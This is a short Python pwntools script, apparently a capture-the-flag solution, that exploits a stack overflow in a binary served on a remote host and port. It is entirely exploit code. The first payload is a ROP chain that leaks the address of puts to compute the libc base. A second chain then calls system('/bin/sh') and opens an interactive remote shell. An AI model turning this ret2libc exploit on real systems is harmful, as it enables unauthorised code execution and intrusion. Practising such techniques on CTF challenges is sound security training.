from pwn import *

context.log_level = 'debug'

# sh = process('./pwn')
sh = remote('43.156.14.141', 1144)
elf = ELF('./pwn')

pop_rdi_rsi = 0x40128C
ret_addr = 0x40128E
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
# libc_start_main_got = elf.got['__libc_start_main']
main = elf.symbols['main']

payload = flat([b'A' * 16, p64(0xdeadbeef), p64(pop_rdi_rsi), p64(puts_got), p64(0), p64(puts_plt), p64(main)])
sh.sendlineafter(b'Free backdoor for ya!\n', payload)

puts_addr = u64(sh.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))

libc_puts = 0x80ed0
libc_system = 0x50d60
libc_bin_sh = 0x1d8698

libcbase = puts_addr - libc_puts
system_addr = libcbase + libc_system
binsh_addr = libcbase + libc_bin_sh

payload = flat([b'A' * 16, p64(0xcafebabe), p64(ret_addr), p64(pop_rdi_rsi), p64(binsh_addr), p64(0), p64(system_addr)])
sh.sendline(payload)

# sh.sendline(b'cat /flag')
# print(sh.recvline())

sh.interactive()
